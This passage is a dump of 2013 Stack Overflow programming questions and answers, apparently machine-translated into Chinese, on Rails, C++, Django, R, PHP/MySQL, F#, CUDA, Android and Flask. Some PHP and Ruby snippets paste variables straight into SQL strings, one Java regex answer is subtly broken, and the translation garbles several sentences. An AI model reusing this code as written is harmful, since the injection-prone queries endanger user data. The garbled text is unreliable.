    ...
  end
end 
```

这两种解决方案对我来说都很烦人，可能有一种方法可以告诉 rails 到 app 下的命名空间目录，但我不知道该怎么做

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:45:56.103

Rails 需要知道要加载哪些目录（默认的一部分）。尝试：

```
#config.application.rb
config.autoload_paths += %W(#{config.root}/queries) 
```

# c++ - 工作线程中自动变量的重新分配

> ID：14348897
> 
> 赞同：1
> 
> 时间：2013-01-15T23:32:30.863
> 
> 标签：c++, c, multithreading, memory-management

我是否正确地认为，在下面的代码片段中，自动变量`x`和`y`将在 while 循环的每次传递中重新分配到堆栈上并且永远不会释放，最终导致堆栈溢出？`z`在从内`while`循环范围激发后释放之前，是否还会在每次传递中重新分配 10次？

如果这个片段被放置在一个工作线程中，堆栈是否会在线程完成其时间分配后被保存以供重新进入，即，将`x`永远`y` *不会*被释放？

```
while (1)
{
    int x = 0;
    int *y = &x;

    while (x < 10)
    {
        int z = 0;
        ++x;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:34:08.677

> 最终导致堆栈溢出？

不会。自动变量在超出范围时会被清除。如果您愿意，您可以认为堆栈在每次迭代开始时增长，然后在每次迭代结束时收缩。（在实践中是否发生这种情况是另一回事......）

> 如果这个片段被放置在一个工作线程中，在线程完成其时间分配后，堆栈是否会被保存以供重新进入，即 x 和 y 永远不会被释放？

在正常运行的系统中，每个线程都有自己的堆栈，该堆栈在该线程终止时被清理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:34:20.573

不，没有问题。自动变量每次都可以轻松地重用相同的空间。请记住，自动变量的生命周期在块的末尾结束，因此它们的生命周期永远不会超过一次迭代。

（事实上​​，你需要*更多*的代码来构建每次迭代使用*不同*内存位置的东西——你必须保留一个额外的计数器并每次计算一个偏移量！）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T23:35:17.287

和`x`的空间将在每个循环中重复使用。任何地方都没有动态分配或释放。`y``z`

通常局部自动变量的空间会在函数入口处分配到栈上，并在函数结束时释放。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-16T00:00:23.317

对于这种情况，您可以使用以下命令轻松检查编译器正在执行的操作

`gcc -g -c yourfile.c`

然后查看生成的程序集

`objdump -d -M intel -S yourfile.o`：

```
00000000 <main>:
int main() {
   0:   55                      push   ebp
   1:   89 e5                   mov    ebp,esp
   3:   83 ec 10                sub    esp,0x10 
```

啊! 这是堆栈指针被修改的地方。请注意，对于您的函数的其余部分，它是单独存在的：堆栈不会增长。

```
 while (1)
        {
            int x = 0;
   6:   c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0 
```

让我们`x`放在`[ebp-0xc]`...

```
 int *y = &x;
   d:   8d 45 f4                lea    eax,[ebp-0xc]
  10:   89 45 f8                mov    DWORD PTR [ebp-0x8],eax 
```

...并且`y`在`[ebp-0x8]`.

```
 while (x < 10)
  13:   eb 10                   jmp    25 <main+0x25>
        {
                int z = 0;
  15:   c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0 
```

`z`总是在`[ebp-0x4]`！

```
 ++x;
  1c:   8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
  1f:   83 c0 01                add    eax,0x1
  22:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
  25:   8b 45 f4                mov    eax,DWORD PTR [ebp-0xc] 
```

`x`还在`[ebp-0xc]`！

```
 28:   83 f8 09                cmp    eax,0x9
  2b:   7e e8                   jle    15 <main+0x15>
  2d:   eb d7                   jmp    6 <main+0x6> 
```

# c++ - c ++常量函数声明变体？

> ID：14348907
> 
> 赞同：2
> 
> 时间：2013-01-15T23:33:01.097
> 
> 标签：c++

以下所有声明都相同吗？如果是这样，声明常量函数的标准方法是什么？

```
const SparseMatrix transpose();

SparseMatrix transpose() const;

const SparseMatrix transpose() const; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T23:35:29.627

函数名左边的 const 表示返回的对象不能修改。右侧的 const 表示该方法是类的一部分，并且不修改其任何数据成员。除非或当然它的任何数据成员是用关键字声明的，在这种情况下，尽管有保护，`mutable`但仍允许对其进行修改。`const`

`const`当函数的返回类型是非指针类型时，关键字的位置并不重要：

```
 T const f(); // same as const T f(); 
```

但是，请注意，`const`在使用*指针*作为返回类型时，关键字的位置很重要。例如：

```
const T* f(); 
```

此方法返回一个指向 const 的指针`T`。也就是说，它指向的东西是不可变的。因此，您不能通过取消引用返回的指针来进行赋值：

```
T* x = f();

*x = y; // error: assignment of read-only location '*(const T*)x' 
```

当 const 放在返回类型（即指针）的右侧时，表示指针是 const 且不能更改。

```
T* const f();

int main()
{
    T* x const;

    x = f(); // error: assignment of read-only variable 'x'
} 
```

此外，如果我们`const`在指针的*两侧*都有返回类型，并且`const`表示“不修改类成员”，那么它读作如下：

```
const T* const f() const; 
```

> 一个名为的 const 成员函数`f`，它返回一个指向 const 的 const 指针`T`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-15T23:36:19.790

第一个将返回一个`SparseMatrix`const 且不能更改的值。

第二个声明了一个返回 a 的函数，`SparseMatrix`并确保该函数不会更改任何类变量（假设它是一个成员函数，否则对于这种减速没有意义），除了可变成员。

最后一个两者兼而有之。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T02:30:35.237

1） 返回一个 const 值 2) const 函数，内部没有成员变化 3) 1)+2)

# python - 具有相关名称的反向 FK 查找

> ID：14348909
> 
> 赞同：0
> 
> 时间：2013-01-15T23:33:12.087
> 
> 标签：python, django

我在使用以下反向 FK 查找时遇到问题：

```
class OrderItem(models.Model):
    order = models.ForeignKey(Order, related_name='items')
    title = models.ForeignKey(Title, related_name='order_items')

class OrderItemDelivery(models.Model):
    order_item = models.ForeignKey(OrderItem, related_name='deliveries')
    stage = models.CharField(max_length=20) 
```

我将如何执行以下操作：`OrderItem.objects.filter(order_item_delivery__stage='Beginning')`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:36:35.910

正如您指定`deliveries`为`related_name`，使用它：

```
OrderItem.objects.filter(deliveries__stage='Beginning') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:36:15.607

```
 OrderItem.objects.filter(deliveries__stage='Beginning') 
```

# r - 来自串联的 R 项目文件路径

> ID：14348910
> 
> 赞同：6
> 
> 时间：2013-01-15T23:33:15.957
> 
> 标签：r, function

我正在学习 R 教程。我一直在研究一个函数，该函数的一个部分是接受一个参数并使用它来定义一个目录来查找数据。然后它必须加载该数据。

就目前而言，以下工作：

```
getmonitor <- function(id, directory){

csvfile <- function(id) {
    if (id < 10) { 
        paste0(0,0,id,".csv")
    } else if (id < 100) {
        paste0(0,id,".csv")
    } else paste0(id,".csv")
}

foo <- read.csv(csvfile(id))

} 
```

美好的。但是我现在必须使用“目录”参数来定义必须从中读取 csv 文件的目录。我在这里尝试了各种方法都无济于事。

目前，如果假设数据在工作目录中，则代码有效。我需要说“转到名为（目录）的目录，然后读取.csv。

包含所有数据文件的目录称为“specdata”，因此目录的参数是“specdata”。

我尝试了以下方法：

```
getmonitor <- function(id, directory){

  csvfile <- function(id) {
      if (id < 10) { 
          paste0(0,0,id,".csv")
      } else if (id < 100) {
          paste0(0,id,".csv")
      } else paste0(id,".csv")
  }

  filepath <- append(directory,"/",csvfile(id))

  foo <- read.csv(filepath)

 } 
```

但后来我收到一条错误消息“错误！之后：无效的参数类型”

我已经尝试了一些不同的东西，如果我剪切并粘贴所有代码，它可能会比帮助更混乱。

这样做的合乎逻辑的方法是什么？我在附加的正确轨道上吗？如果没有，我还应该起诉什么？我需要获取参数“目录”，然后从该目录加载数据。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-16T00:47:28.137

```
getmonitor <- function(id, directory=getwd(), ...){

  csvfile <- sprintf("%03d.csv", id)

  filepath <- file.path(directory, csvfile)

  foo <- read.csv(filepath, ...)

  foo

 } 
```

# php - 在 PHP 和 MySQL 中从另一个表中排除项目

> ID：14348918
> 
> 赞同：1
> 
> 时间：2013-01-15T23:33:39.107
> 
> 标签：php, mysql

我有一个表来跟踪每个用户单击的链接，我还有另一个表带有链接。这是每个表结构：

**链接：** id | 链接 | 价值 | 添加日期

**点击：** user_id | 链接ID | date_clicked

现在这是我用来进行搜索的代码并且它有效，我只想知道是否有更有效的方法来做这件事，因为点击的链接表会很快变得非常大。

```
$history_query = mysql_query("SELECT * FROM clicked_links WHERE user_id = '$id'") or die(mysql_error());
$history_array = array();
while ($h = mysql_fetch_array($history_query)) {
    $history_array[] = $h['link_id'];
}
$clicked = implode(',', $history_array);

$link_query = mysql_query("SELECT * FROM chip_links WHERE id NOT IN ($clicked) ORDER BY value DESC") or die(mysql_error());
while ($r = mysql_fetch_array($link_query)) {
    echo "<div id='claim{$r['id']}' style='text-align: center; font-weight: bold; font-size: 18px; float: left; width: 183px;'>
    <a href='{$r['link']}' id='{$r['id']}' class='collect' target='_blank'>
    Claim {$r['value']} points!
    </a>
    </div>";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:47:28.247

运行单个查询来获取结果集比运行单独的查询更有效。

您不需要返回所有`link_id`值，将它们放入数组中，将数组放入字符串中，然后将该字符串推送到另一个查询中，然后将其随机播放回数据库……数据库已经有了。

此查询将返回与您当前的 $link_query 等效的结果集，而不需要 $history_query 或 $history_array。

```
SELECT l.id
     , l.link
     , l.value
  FROM chip_links l
 WHERE l.id NOT IN
       ( SELECT c.link_id
           FROM clicked_links c
          WHERE c.user_id = '$id'
            AND c.link_id IS NOT NULL
       )
 ORDER BY l.value DESC 
```

如果您无法保证 clicked_links 表中的 link_id 不为 NULL，则您需要`link_id IS NOT NULL`在该子查询中包含谓词，因为如果 link_id 值为 NULL，则查询不会返回任何行。（这是一个众所周知且可避免的`NOT IN (subquery)`构造问题。

MySQL 很可能会将其优化为（希望更有效但）等效的 NOT EXISTS 相关子查询，如下所示：

```
SELECT l.id
     , l.link
     , l.value
  FROM chip_links l
 WHERE NOT EXISTS 
       ( SELECT 1 
           FROM clicked_links c
          WHERE c.user_id = '$id'
           AND c.link_id = l.id
       )
 ORDER BY l.value DESC 
```

但是，为了获得最佳性能，您可能希望使用反连接模式。

LEFT JOIN 操作基本上是寻找匹配的行，`IS NOT NULL`谓词会抛出匹配的行，所以你得到的`chip_links`是没有“匹配”行的行`clicked_links`。

MySQL 优化器通常使用如下查询生成最有效的计划：

```
SELECT l.id
     , l.link
     , l.value
  FROM chip_links l
  LEFT
  JOIN clicked_links c
    ON c.link_id = l.id
   AND c.user_id = '$id'
 WHERE c.link_id IS NULL
 ORDER
    BY l.value DESC 
```

为了在大型集合上获得良好的性能，您可能还需要索引

```
... ON clicked_links (user_id, link_id)

... ON chip_links (value, id, link) 
```

这应该允许完全从索引中满足查询，而不需要排序操作。EXPLAIN 输出将包括“使用索引”，不包括“使用文件排序”）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:43:47.747

像这样的一次性查询会告诉你给定用户没有点击的所有链接

```
SELECT l.* FROM chip_links l
LEFT JOIN clicked_links c ON (c.link_id=l.id AND l.user_id='$id')
WHERE c.link_id IS NULL
ORDER BY l.value DESC; 
```

如果您不熟悉左连接，它将包含来自 clicked_links 中连接子句匹配的行，但如果我们没有匹配，我们只会得到空值。由于我们对不匹配感兴趣，WHERE 子句确保这些是我们将获得的唯一行。

这可能比使用两个查询和一些 PHP 代码更有效，但只有一个基准可以肯定地告诉你。您还应该检查 的输出`EXPLAIN SELECT ...`以确保使用了合适的索引。

# ruby-on-rails - 如何在内存中保留用户定义的 ruby 类的实例？

> ID：14348920
> 
> 赞同：-3
> 
> 时间：2013-01-15T23:33:56.867
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我在我的rails 应用程序中编写了一个fax.rb 类来发送在线传真，该类会经常使用。我想在内存中保留它的一个实例。我怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:41:58.047

ruby 类*是*一个单例，因此只能有一个实例......

```
class Fax
  def self.dialup(num)
    # call the fax
  end
end 
```

另一个解决方案是：

```
class Fax
  include Singleton
  ...
end 
```

这将确保你一样。但是，我听说过单身人士的坏事。

# f# - 如何在构造函数中抛出异常？

> ID：14348922
> 
> 赞同：4
> 
> 时间：2013-01-15T23:34:12.540
> 
> 标签：f#

如果我这样做没有意义吗

```
type Point = 
    struct
        val Row: int
        val Column: int

        new (row, column) = if row >= 0 && column >= 0 then { Row = row; Column = column }
                            else failwith "Cooridinators must be non-negative!" 
        // This is not a valid object construction
        static member (+) (x: Point, y: Point) = Point (x.Row + y.Row, x.Column + y.Column)
        static member (-) (x: Point, y: Point) = Point (x.Row - y.Row, x.Column - y.Column)
        static member (*) (x: Point, a) = Point (x.Row * a, x.Column * a)
        static member (*) (a, x: Point) =  Point (x.Row * a, x.Column * a)
    end 
```

如果它是一个类，那么也许我可以在绑定期间引发异常`do`，但是在结构中没有`do`，我应该怎么做？

我发现可以在之后添加另一个构造函数`failwith`来解决这个问题，但它提出了另一个问题，我怎样才能调用隐式构造函数？我必须先明确地构造它吗

```
new () = { Row = 0; Column = 0} 
// Error structs auto supports a default constructor 
```

如果我只是使用默认构造函数执行此操作

```
new (row, column) = if row >= 0 && column >= 0 then { Row = row; Column = column }
                    else
                        failwith "Cooridinators must be non-negative!"
                        new Point () // error 
```

在我看来，`Point ()`返回一个单位而不是`Point`?

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-16T00:45:12.213

我认为 F# 编译器会抱怨，因为构造函数应该总是有一个结构：

> `new (` *模式* `) =` *表达式* `{` *初始化* `} [then` *表达式* `]`

因此，初始化字段的部分不能嵌套在`if`任何其他表达式之下或内部。您可以在初始化之前或之后（如果添加`then`关键字）抛出异常。（这对于具有继承的类很重要，但我认为它对结构没有任何影响。）

因此，编写代码的一种方法是编写：

```
type Point = 
    struct
        val Row: int
        val Column: int

        new (row, column) = 
          if row < 0 || column < 0 then failwith "Cooridinators must be non-negative!"
          { Row = row; Column = column }          

        // (Static members omitted)
    end 
```

请注意，我必须否定条件，因为您需要指定*要抛出*异常的情况（而不是说何时可以构造对象）。另一种选择是：

```
new (row, column) = 
  { Row = row; Column = column }          
  then if row < 0 || column < 0 then failwith "Cooridinators must be non-negative!" 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-16T07:54:23.007

您还有另一种方法可以在*初始化*部分抛出异常：

```
new (row, column) = 
  { Row = ((if row < 0 || column < 0 then failwith "Coordinators must be non-negative!"); row); 
    Column = column } 
```

*请记住，验证结构构造函数并不总是一个好主意*。正如您所发现的，您无法控制默认构造函数的初始化。如果它是一个类，您可以确保以您想要的方式验证所有构造函数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-01-08T13:25:35.060

这是一个老问题。但是，没有一个答案提到这一点：我认为惯用的 F# 方式根本*不抛出异常*！为此，您可以使用 a ，如果所有条件都满足并且出现问题`static member tryCreate`，它将返回。然后，您将遵循选项类型的踪迹来编写逻辑代码，而不是处理异常！我还认为 F# 记录可能也是一种更惯用的方式，除非您明确需要 struct 用于某些非常特定的目的。 `Some Point``None`

# java - Java 正则表达式中间字符串匹配

> ID：14348926
> 
> 赞同：0
> 
> 时间：2013-01-15T23:34:29.150
> 
> 标签：java, regex

我有一个字典文件，其中包含
ns*.abc.com
ns*.xyz.com 行
我想将 ns15.abc.com、nsABC.abc.com 等模式与字典文件匹配并返回 true。例如 ns15.abc.com 匹配，而 ns16.ABC.abc.com 不匹配。提前致谢

```
public class ValidateDemo {  
    public static void main(String[] args) {  
    List<String> input = new ArrayList<String>();  

    input.add("ns14.abc.com");
    for (String str : input) {
        if (str.matches("ns*.abc.com")) {
            System.out.println("Match: " + str);
        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:42:07.753

在字典中的每个条目中，将星号替换为`"[^\.]*"`并用点替换`"\."`- 每个条目都有您的模式：

```
 Pattern p = Pattern.compile("^" + dictEntry.replaceAll(".", "\\.").replaceAll("*", "[^\\.]*") + "$"); 
```

或者您也可以使用“|”连接所有字典条目 让单一模式匹配它们。

# c# - .NET WCF 服务和 $.ajax POST

> ID：14348927
> 
> 赞同：0
> 
> 时间：2013-01-15T23:34:46.670
> 
> 标签：c#, jquery, wcf

我会尽量保持简单，所以请随时询问更多细节。

我有一个应用程序，我使用 jQuery 1.8.3 和 $.ajax 方法来发布数据...... ajax 调用 .net wcf 服务......

我的应用程序有一个客户端控制台，我可以在其中记录调试信息。所以这里的js代码：

```
 Console.WriteLine(Console.GetTime());
    xhr = jQuery.ajax({
        cache: false,
        async: async,
        url: url,
        type: "POST",
        processData: true,
        contentType: "application/json",
        timeout: 600000,
        dataType: "json",
        data: data,
        success: AjaxSuccess,
        error: AjaxError
    }); 
```

Ajax 调用工作正确...（Console.GetTime() 只是格式化当前时间）。

服务器和客户端都在同一台机器上运行...

我试图挖掘代码以找出一些性能问题。由于某种原因，该函数大约需要 1100 毫秒。在服务器端，我证明它用了不到 100 毫秒...

所以这是我的问题......为什么在我触发 $.ajax 命令和服务器上的操作开始之间会有某种延迟？我比较了双方的时间戳，总是有大约 1000 毫秒....有什么想法吗？

非常感谢

# cuda - CUDA 5.0 想要 CUDA 4.0 的 libcudart？

> ID：14348929
> 
> 赞同：2
> 
> 时间：2013-01-15T23:35:02.537
> 
> 标签：cuda, gpu, nvidia, nvcc

我刚刚从 CUDA 4.2 升级到 CUDA 5.0。毫不奇怪，曾经被命名的库`libcudart.so.4`现在被称为`libcudart.so.5.0`. 使用 nvcc 5.0 重新编译我的代码并尝试运行代码后，我收到以下消息：

```
./main: error while loading shared libraries: libcudart.so.4: cannot open shared object file: No such file or directory 
```

是的，你这个愚蠢的系统，我知道没有`libcudart.so.4`。那是因为它现在被称为`libcudart.so.5.0`. **为什么要寻找`libcudart.so.4`而不是`libcudart.so.5.0`，我该如何解决？**

* * *

到目前为止我已经尝试过：

我已经检查过我的所有路径都井井有条。设置了这些环境变量：

```
export PATH=$PATH:/usr/local/cuda/bin:/usr/lib
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/lib:/usr/local/cuda/lib64:/lib
#note: /usr/local/cuda is symlinked to /usr/local/cuda-5.0 
```

我已经验证`libcudart.so.5.0`可以在其中一个`LD_LIBRARY_PATH`目录中找到它。

我使用 CUDA 5.0 版本重新编译了我的 CUDA 应用程序`nvcc`。我在另一台装有 CUDA 4.2 的机器上和另一台装有 CUDA 4.0 的机器上成功编译并运行了我的应用程序。

我确认这`nvcc`确实在 5.0 版上：

```
user@host$ nvcc --version
nvcc: NVIDIA (R) Cuda compiler driver
Copyright (c) 2005-2012 NVIDIA Corporation
Built on Fri_Sep_21_17:28:58_PDT_2012
Cuda compilation tools, release 5.0, V0.2.122 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-20T21:56:51.630

我想把这个问题从未回答的列表中删除，我认为@Jared Hoberock 不会介意，所以我将发布他的评论作为答案。如果有问题并且 Jared 或 SolvePuzzles 发布了答案，我将删除我的（假设它不被接受——我无法删除已接受的答案 AFAIK）。

`nvcc`似乎与`libcudart.a`版本 4 静态链接。

在您的 lib 路径中的某处，似乎`nvcc`正在找到一个 old `libcudart.a`，需要将其删除。

对于其他读者来说，找到系统上的所有实例并删除任何与您所需的 CUDA 版本不匹配的实例就足够了`libcudart.*`（假设您没有尝试运行具有多个可用 CUDA 版本的机器——在这种情况下，必须适当管理编译和运行的库路径）

# c# - MMC 管理单元和 .Net 4.x

> ID：14348930
> 
> 赞同：3
> 
> 时间：2013-01-15T23:35:06.330
> 
> 标签：c#, .net-4.0, mmc

我们最近将所有项目升级到 Visual Studio 2012 和 .Net 4.5。我们的大多数项目都有处理产品配置的自定义 MMC 管理单元。我现在了解到 MMC 3.0 本身并不能处理 .Net 4.0 运行时，因为运行时是在 MMC 3.0 发布很久之后才发布的。

我正在寻找一种方法来修复我们的管理单元，以便 MMC 在加载时不会崩溃，并且我遇到了很多提到添加 mmc.exe.config 文件的页面。我已经尝试过了，但我无法让它工作。

我创建了一个文件，其内容如下：

```
<configuration>
  <startup>
    <supportedRuntime version='v4.0.20506' />
    <requiredRuntime version='v4.0.20506' safemode='true' />
  </startup>
</configuration> 
```

我在 windows\system32 和 windows\sysWOW64 目录中都将它保存为 mmc.exe.config，但是这个文件的存在没有任何区别。我的管理单元仍然崩溃并显示相同的错误消息：

```
Could not load file or assembly 'xxxx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=d62dabb4275ffafc' or one of its dependencies. This assembly is built by a runtime newer than the currently loaded runtime and cannot be loaded. 
```

我需要做什么才能让 MMC 正确加载 .Net 4.0 运行时程序集？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-04-10T08:52:45.187

对我来说，告诉 MMC 使用 v4 框架很有效，我有 v4.0.30319

```
set COMPLUS_version=v4.0.30319
start SomeConsole.msc 
```

检查解决方法： [http ://connect.microsoft.com/VisualStudio/feedback/details/474039/can-not-use-net-4-0-to-create-mmc-snapin](http://connect.microsoft.com/VisualStudio/feedback/details/474039/can-not-use-net-4-0-to-create-mmc-snapin)

这是我的调试设置：![在此处输入图像描述](../Images/7805e303eb32bf9a2a29df194a8f4c4e.png)

我使用的是 32 位版本的控制台，并且还必须将以下内容添加到“c\Windows\SysWOW64\mmc.exe.config”中：

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <startup useLegacyV2RuntimeActivationPolicy="true">
        <supportedRuntime version='v4.0' />
    </startup>
</configuration> 
```

希望它可以帮助你。总帐

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-11T19:04:51.833

查看此页面上的评论 ( [http://msdn.microsoft.com/en-us/library/ms692759%28VS.85%29.aspx](http://msdn.microsoft.com/en-us/library/ms692759%28VS.85%29.aspx) )。看起来托管 MMC 管理单元最多可以针对框架 3.5。

# ruby-on-rails - 如何在 ruby /rails 中声明 const 变量

> ID：14348932
> 
> 赞同：-1
> 
> 时间：2013-01-15T23:35:13.777
> 
> 标签：ruby-on-rails, coding-style, constants

我想成为一个更好的代码.. 让我的代码更简洁、更易读。

我在 c/c++ 中看到的一件事是在局部变量上使用 const。我认为告诉读者我的代码一旦设置了变量，它就不会在函数/方法中更改，这是很有价值的。

我想知道....有没有办法表明局部变量是常量？

```
#for example 
sql = "select * from table1 where status = #{iStatusId}"
connection.execute(sql) 
```

此方法中的 sql 不会改变。我可以这样标记吗？

好的..这是一个不好的例子，但我认为重点是......我希望:)

编辑：我在 sql 中添加了一些动态 .. iStatusId 位是传递给方法的参数。

EDIT2：我用谷歌搜索了这个......所有文章都谈到了幻数替换。这很简单，我认为是 MACRO。CONTATS 很容易......我正在寻找 const.. 它们是非常不同的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T00:56:38.290

通过使用类似这样的东西来制作您所描述的逻辑很容易：

```
class Thing

    def unchangeable_attribute
      @unchangeable_attribute
    end

    def unchangeable_attribute=(value)
      raise SomeError if @unchangeable_attribute
      @unchangeable_attribute = value
    end

end 
```

不过，我倾向于同意戴夫牛顿的观点，因为我很难想象这样的事情会有一个很好的用例......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T07:56:04.177

`obj.freeze`Ruby 对象上定义的方法呢​​？从[文档](http://ruby-doc.org/core-1.9.3/Object.html#method-i-freeze)：

> 防止对 obj 进行进一步修改。如果尝试修改，将引发 RuntimeError。无法解冻冻结的对象。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-01-15T23:46:06.933

常量仅以大写字母开头，因此以下内容可以正常工作：

```
MY_CONSTANT = 1234 
```

然而，覆盖常量是可能的，尽管它会发出警告。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-01-16T00:47:58.860

ruby 中的 const 并不是严格合乎逻辑的。由于“所有”变量实际上只是指向对象的掩码指针，因此将它们转换为 const 的 c 范式是没有意义的。

它将等于 const void * value = 'bla';

您仍然可以更改值 [1]。

我很想在这里被证明是错误的。

# java - 以编程方式接听电话

> ID：14348933
> 
> 赞同：1
> 
> 时间：2013-01-15T23:35:16.053
> 
> 标签：java, android, call

我搜索了很多主题，我知道我的问题之前被问过。我正在编写一个覆盖默认来电应用程序的应用程序。没有好的解决方案，但我发现最好的解决方案是使用

```
 Intent buttonDown = new Intent(Intent.ACTION_MEDIA_BUTTON);
    buttonDown.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(
            KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_HEADSETHOOK));
    context.sendOrderedBroadcast(buttonDown,
            "android.permission.CALL_PRIVILEGED");

    Intent buttonUp = new Intent(Intent.ACTION_MEDIA_BUTTON);
    buttonUp.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(
            KeyEvent.ACTION_UP, KeyEvent.KEYCODE_HEADSETHOOK));
    context.sendOrderedBroadcast(buttonUp,
            "android.permission.CALL_PRIVILEGED"); 
```

但它并不是一直都在工作。另一个使用电话服务的服务不适用于 android 版本 2.3+。我想知道[Ultimate Call Screen](https://play.google.com/store/apps/details?id=com.lowveld.ucs&feature=search_result#?t=W251bGwsMSwxLDEsImNvbS5sb3d2ZWxkLnVjcyJd)等应用程序如何接听电话。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T00:05:54.673

[http://code.google.com/p/auto-answer/source/browse/trunk/src/com/everysoft/autoanswer/AutoAnswerIntentService.java](http://code.google.com/p/auto-answer/source/browse/trunk/src/com/everysoft/autoanswer/AutoAnswerIntentService.java)

他们通过拨打蓝牙服务并假装有人按下手机上的接听按钮来作弊。

# actionscript-3 - 使对象跟随鼠标问题

> ID：14348941
> 
> 赞同：0
> 
> 时间：2013-01-15T23:35:44.947
> 
> 标签：actionscript-3

感谢您花时间回答我的问题。所以问题是制作一个简单的矩形跟随我的鼠标。我真的不明白为什么这段代码不起作用。包类

```
{
    import flash.display.MovieClip;
    import flash.display.Stage;

    import flash.events.Event;

    public class watever extends MovieClip
    {
        var stageRef:Stage;

        public function watever(x:Number, y:Number, stageRef:Stage)
        {
            this.x = x;
            this.y = y;
            this.stageRef = stageRef;
            addEventListener(Event.ENTER_FRAME, moveMe, false, 0, true);

        }

        public function moveMe(e:Event):void
        {
            this.x = mouseX;
            this.y = mouseY;

            trace(mouseX);
        }
    }
} 
```

该对象只是在“奇怪”的地方，所以我试图追踪 mouseX，我在输出中得到了愚蠢的数字

```
-1373
1790
-1373
1790
-1373
1790
-1373
1790
-1373
1790
-1373
1790
-1373 
```

但是，如果我从父类声明它，它工作正常。请问代码有什么问题吗？（以下是它在父类中的工作方式）

```
public function DocumentClass()
        {

            c = new watever(200, 200, stage)
            stage.addChild(c);
            addEventListener(Event.ENTER_FRAME, loop, false, 0, true);

        }
        private function loop(e:Event):void
        {
            c.x = mouseX;
            c.y = mouseY;
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T00:21:30.657

鼠标位置是相对于 DisplayObject 的（`mouseX`就像`this.mouseX`这样更清晰一样），因此如果您的`watever`MovieClip 在舞台上的 (0, 50) 处，并且鼠标在 (0, 60) 处，则为`watever.mouseY`10。

当您从文档类中读取它时，您将获得`mouseX`并`mouseY`相对于舞台，这就是它正常工作的原因。你可以改变 moveMe() 来做到这一点：

```
public function moveMe(e:Event):void
{
    this.x = stageRef.mouseX;
    this.y = stageRef.mouseY;
} 
```

# joomla - Joomla 主页和全局配置显示 404 错误，我该如何解决？

> ID：14348942
> 
> 赞同：0
> 
> 时间：2013-01-15T23:35:44.877
> 
> 标签：joomla, http-status-code-404

当我转到我`joomla`网站的主页 url 时，会`404 error`显示一个简单的内容`404 Not Found`。我在菜单项管理器中将主页设置为默认值。还有其他方法可以解决这个问题吗？另外，`404 error`当我转到全局配置页面时，我得到了一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T03:47:28.350

我相信我们也有同样的问题。我认为你的 joomla 网站也可能被黑了，解决这个问题很容易。您基本上只需要删除文件。这是对问题 [http://forum.joomla.org/viewtopic.php?f=428&t=786545](http://forum.joomla.org/viewtopic.php?f=428&t=786545)的参考。

# php - 未定义的偏移量：0 in

> ID：14348945
> 
> 赞同：0
> 
> 时间：2013-01-15T23:35:55.597
> 
> 标签：php

对php不太了解，但我可以弄清楚并复制和粘贴。我的虚拟主机似乎已经更新了 php，并且运行了多年的代码现在抛出了错误。我有人将我的 php 连接开发到一个文件生成器数据库，但他不再可以帮助我解决这个问题：

问题出现在两个地方：

```
> Undefined offset: 0 in 
```

这是代码：

```
$resultData = $Result['data'][$DataKeys[0]];
// and here: 
$aRecID = preg_split('[.]',$DataKeys[0]); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:37:40.760

就是`$DataKeys[0]`不存在的意思。
试穿`var_dump`，`$DataKeys`看看里面有什么。

使用这个小辅助函数，它会产生更好的输出：

```
function pr($var) {
  echo "<pre>";
  var_dump($var);
  echo "</pre>";
} 
```

# python - Flask-Admin - 自定义视图

> ID：14348946
> 
> 赞同：6
> 
> 时间：2013-01-15T23:36:07.073
> 
> 标签：python, flask, flask-admin

我正在使用 Flask 和 pyMongo 开发一个 Web 应用程序，鉴于新的 mongodb 支持，我最近开始集成 Flask-Admin 模块（1.0.4）。

使用 ModelViews 时一切都很顺利，但是当涉及到 BaseView 的子类化时，我根本无法让它工作。

这是我的设置：

* * *

```
user_view = Admin(app, name='User stuff', url="/user", endpoint="user")

class ProfileForm(wtf.Form):
    username = wtf.TextField('Username', [wtf.Required()])
    name = wtf.TextField('Name', [wtf.Required()])
